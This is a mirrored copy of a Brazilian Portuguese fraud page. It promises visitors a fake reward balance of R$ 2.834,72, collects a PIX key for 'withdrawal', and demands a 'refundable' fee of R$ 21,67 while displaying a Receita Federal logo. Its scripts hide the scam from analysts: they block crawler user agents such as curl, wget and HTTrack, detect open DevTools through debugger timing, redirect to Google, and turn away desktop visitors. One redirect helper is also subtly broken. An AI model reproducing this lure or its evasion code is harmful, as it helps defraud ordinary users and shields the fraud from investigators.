...
<!-- Mirrored from mundolindtop.fun/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Nov 2025 14:42:52 GMT -->
    ...
    <main id="screens">
      <section id="one" class="screen">
          ...
          >
            <div class="saldo-info">
              ...
              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
                <span
                  class="valor-currency valor-currency-dois valor-currency-tres"
                  data-amount-target="2834.72"
                  >R$ 2.834,72</span
                >
              </div>
            </div>
        ...
        <div class="bloco-dois">
          ...
          <div class="concluiu">
            <span class="concluiu-txt"
              >Você concluiu todos os dias de check-in.</span
            >
          </div>
          <div class="dia">
          ...
          <div class="entre">
            <span class="entre-txt entre-txt-dois"
          ...
          <div class="barra">
            ...
            <div class="obtem">
              <span class="obtem-txt"
                >Obtém 21 pontos por escreveres uma consulta na barra de
      ...
      <section id="two" class="screen" aria-hidden="true">
        ...
        >
          <div class="popup">
            ...
            <span class="gol-txt"
              >Parabéns! Como parte de uma campanha de recompensas exclusiva. </span
            ><span
              class="valor-currency gol-valor valor-currency-dois valor-currency-quatro"
              data-amount-target="2834.72"
              >R$ 2.834,72</span
            >
            ...
            <button
              ...
              data-modal-close
            >
              <span class="btn-text btn-textdois btn-txt-obrigado"
                >Obrigado</span
              >
            </button>
          </div>
      ...
      <section id="three" class="screen">
          ...
          >
            <div class="saldo-info saldo-info-dois">
              ...
              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
                <span
                  class="valor-currency valor-currency-dois"
                  data-amount-target="2834.72"
                  >R$2.834,72</span
                >
            ...
            <div class="saldo-action">
              <span class="saldo-img"
                ><img
                  src="images/p-saldo-maior.png"
                  alt=""
                  class="p-saldo p-saldo-maior"
              /></span>
            </div>
          </div>
        </div>
        ...
        <div class="saldo saldo-tres">
          ...
          >
            <div class="saldo-info saldo-info-dois">
              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
                <span class="total-pontos total-pontos-dois"
                  >Última recompensa: R$ 646,43</span
                >
              </div>
            </div>
          </div>
        ...
        <div class="saldo saldo-sacar">
          ...
          >
            <div class="saldo-info saldo-info-sacar">
              ...
              <div class="saldo-valor" aria-live="polite">
                <span class="transferencia-txt"
                  ><img
                    src="images/fi-rs-credit-card.png"
                    alt="" />Transferencia via /
                  <img src="images/pix-logo.svg" alt="" class="pix-logo-transf"
                /></span>
              </div>
            </div>
          </div>
          ...
          <button
            type="button"
            class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel"
            aria-label="sacar dinheiro"
          >
            <span class="btn-text btn-textdois-sacar btn-three-saque"
              >Sacar dinheiro</span
            >
          </button>
          <div class="obtem obtem-sacar sacar-dinheiro">
            <span class="obtem-txt"
              >Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
        ...
        <div class="saldo saldo-sacar">
          <div
            class="container-saldo ctn-flor"
            role="region"
            aria-labelledby="saldo-title"
          >
            ...
            <div class="saldo-info obtenha-title">
              <div class="saldo-label">
                <span class="saldo-sacar-text obtenha-txt"
                  >Obtenha Moedas para a LIVE</span
                >
              </div>

              <div
                class="saldo-valor saldo-valor-tres border-none"
                aria-live="polite"
              >
                <span class="transferencia-txt moedas-txt"
                  >Use Moedas para enviar presentes virtuais para seus hosts de
                  live Favoritos.</span
                >
              </div>
            </div>
        ...
        <div class="saldo saldo-sacar">
          ...
          >
            <div class="saldo-info obtenha-title">
              ...
              <div
                class="saldo-valor saldo-valor-tres celular-recarga"
                aria-live="polite"
              >
          ...
          <div class="obtem obtem-sacar">
            <span class="obtem-txt recarga-txt"
              >Voce precisa de um saldo mínimo de R$10 para recarga de
              celular</span
            >
          </div>
        </div>
        ...
        <div class="modal-inner inner-pop saque-popup">
          ...
          <div class="form-container">
            ...
            <div class="form-group">
              ...
              <div
                class="pix-selector"
                id="pix-type-selector"
                data-open-modal="six"
                role="button"
                tabindex="0"
              >
                <span class="placeholder-text" id="pix-selector-text"
                  >Escolha o tipo de chave PIX</span
                >
                <span class="arrow arrow-tois"
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="5"
                    height="9"
            ...
            <div class="form-group">
              ...
              <div id="pix-key-wrapper" class="input-wrapper-disabled">
                <input
                  ...
                  class="nome-completo input-disabled"
                  disabled
                />
              </div>
            </div>
            ...
            <button
              type="button"
              id="btn-enviar-pix"
              class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled"
              aria-label="sacar dinheiro"
            >
      ...
      <section id="nine" class="screen" aria-hidden="true">
        <div class="confirmation-container">
          ...
          <div class="confirmation-section confirmation-balance">
            ...
            <div
              class="confirmation-balance-amount"
              data-amount-target="2834.72"
            >
              R$ 2.834,72
            </div>
          ...
          <div class="confirmation-section">
            ...
            <div class="confirmation-fee-amount">
              R$ 21,67
              <span class="confirmation-reembolso-badge"
                >VALOR REEMBOLSÁVEL</span
              >
            </div>
          ...
          <div class="confirmation-section">
            ...
            <div class="confirmation-receipt-grid">
              <div class="confirmation-receipt-item">
                ...
                <div
                  class="confirmation-receipt-value"
          ...
          <div class="confirmation-section">
            ...
            <div class="confirmation-requirements-grid">
              ...
              <div class="confirmation-requirement-item">
                <div
                  class="confirmation-requirement-icon confirmation-reembolso"
                >
                  ✓
                </div>
                <div class="confirmation-requirement-content">
                  <div
                    class="confirmation-requirement-title confirmation-reembolso"
                  >
...
function herdarUTMeRedirecionar(urlDestino) {
    ...
    const urlAtual = new URL(window.location.html);
    ...
    const urlFinal = new URL(urlDestino.html);
    ...
    window.location.href = urlFinal.toString();
            ...
            <div
              class="confirmation-success-message"
          ...
          <div class="confirmation-security-grid">
            ...
            <div class="confirmation-security-item">
              <div class="confirmation-security-label">
                <img
                  src="images/receitafederal.png"
                  alt=""
                  class="img-receitafederal"
                />
              </div>
            </div>
          </div>
          ...
          <div class="confirmation-footer">
            ...
            <a href="#nine" class="confirmation-footer-link"
              >Precisa de ajuda?</a
            >
          </div>
        </div>
...
<script>
(function(){
  const redir = "https://google.com"; 

  var ua = (navigator.userAgent || "").toLowerCase();
  var isMobile = /android|iphone|ipad|ipod/.test(ua);
  var bad = /httrack|wget|curl|python-requests|saveweb2zip|httpclient|scrapy/.test(ua);

  // BLOQUEIO DE BOTS
  if (bad) {
    document.body.innerHTML = "<h1 style='text-align:center;margin-top:40vh;font-family:sans-serif;'>Acesso bloqueado 🚫</h1>";
    console.warn("Bot/clonador detectado: ", ua);
    window.stop();
  }
  ...
  // INSERÇÃO DE TOKEN DINÂMICO
  var token = Math.random().toString(36).substr(2, 12);
  var div = document.createElement("div");
  div.style.display = "none";
  div.setAttribute("data-protect", token);
  document.body.appendChild(div);

  // DETECTOR DE DEVTOOLS
  function detectDevTools(){
    const start = performance.now();
    debugger; // se DevTools estiver aberto, isso vai atrasar a execução
    const end = performance.now();
    if (end - start > 100) { // diferença de tempo sugere debug ativo
      document.body.innerHTML = "<h1 style='text-align:center;margin-top:40vh;font-family:sans-serif;'>DevTools detectado 🚫</h1>";
      setTimeout(()=>window.location.replace(redir),500);
    }
  }

  // Roda o detector em loop
  setInterval(detectDevTools, 1000);

  // ANTI-DEBUG ARMADILHA
  (function blockDebug(){
    function loop(){
      try {
...
(function(){
  ...
  var agentes = ["HTTrack","WebCopy","curl","Wget","python","SaveWeb2Zip","Go-http-client","Puppeteer","node-fetch"];
  var ua = navigator.userAgent;
  if(agentes.some(f => ua.includes(f))){
    document.write("<h1 style='color:red;text-align:center;'>Acesso negado 🚫</h1>");
    throw new Error("Clonador detectado");
  }

  // Bloqueio de desktop (verificação real)
  const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const isMobileUA = /Mobi|Android|iPhone|iPad/i.test(ua);
  const isSmallScreen = window.innerWidth <= 768;

  if (!(isTouchDevice && isMobileUA && isSmallScreen)) {
    document.write("<h1 style='color:red;text-align:center;margin-top:20%;'>Acesso permitido apenas por dispositivos móveis 📱</h1>");
    throw new Error("Desktop bloqueado");
  }
  ...
  setInterval(function(){
    ...
    if(fim - inicio > 100 && !devAberto){
      devAberto = true;
      document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%;'>DevTools detectado. Página bloqueada. 🚫</h1>";
...
<script>
(function(){
  // Detecta se é celular (tela pequena + touch + userAgent de mobile)
  const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const isMobileUA = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
  const isSmallScreen = screen.width <= 768;

  // Se NÃO for um dispositivo móvel real, bloqueia tudo
  if (!(isTouch && isMobileUA && isSmallScreen)) {
    document.documentElement.innerHTML = `
      <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px;">
        <div>
          <h1 style="font-size:2em;">🚫 Acesso bloqueado</h1>
          <p>Este site só pode ser acessado por dispositivos móveis.</p>
        </div>
      </div>`;
    throw new Error("Acesso por desktop bloqueado");
  }

  // Segurança extra contra DevTools
  setInterval(() => {
    const start = performance.now();
    debugger;
    const end = performance.now();
...
<!-- Mirrored from mundolindtop.fun/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Nov 2025 14:42:59 GMT -->
</html>
